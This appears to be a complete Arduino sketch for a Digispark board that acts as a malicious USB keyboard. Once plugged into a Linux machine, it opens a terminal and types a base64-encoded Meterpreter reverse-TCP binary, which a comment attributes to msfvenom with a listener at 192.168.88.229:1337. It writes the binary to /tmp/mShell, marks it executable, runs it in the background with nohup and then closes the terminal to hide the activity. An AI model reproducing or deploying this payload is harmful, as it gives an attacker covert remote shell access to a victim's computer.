#include "DigiKeyboard.h"

#define KEY_DELETE      76

void setup() {

  // LED on.
  pinMode(1, OUTPUT);
  delay(200);
  // Start to inject payload, turn the LED on
  digitalWrite(1, HIGH);
  DigiKeyboard.sendKeyStroke(KEY_DELETE); // Clean
  delay(200);

  DigiKeyboard.sendKeyStroke(KEY_T , MOD_CONTROL_LEFT | MOD_ALT_LEFT);
  delay(300);

  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
  // Wait for terminal to open
  delay(1000);

  // Send our payload
  DigiKeyboard.print("echo");
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
//  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.88.229 LPORT=1337 -f elf | base64
  DigiKeyboard.print("f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjPAAAASgEAAAcAAAAAEAAAagpeMdv341NDU2oCsGaJ4c2Al1towKhY5WgCAAU5ieFqZlhQUVeJ4UPNgIXAeRlOdD1oogAAAFhqAGoFieMxyc2AhcB5vesnsge5ABAAAInjwesMweMMsH3NgIXAeBBbieGZsmqwA82AhcB4Av/huAEAAAC7AQAAAM2A | base64 --decode > /tmp/mShell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(500);

  // Change the permissions for the file and execute it
  DigiKeyboard.println("chmod 755 /tmp/mShell && nohup /tmp/mShell &");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(200);

  // Exit
  DigiKeyboard.println("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.println("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  delay(100);
  // Payload executed!
  digitalWrite(1, LOW);

}

void loop() {
  // When scripts are done, blink some LED like it's 19

  digitalWrite(1, HIGH);
  delay(200);

  digitalWrite(1, LOW);
  delay(300);

}
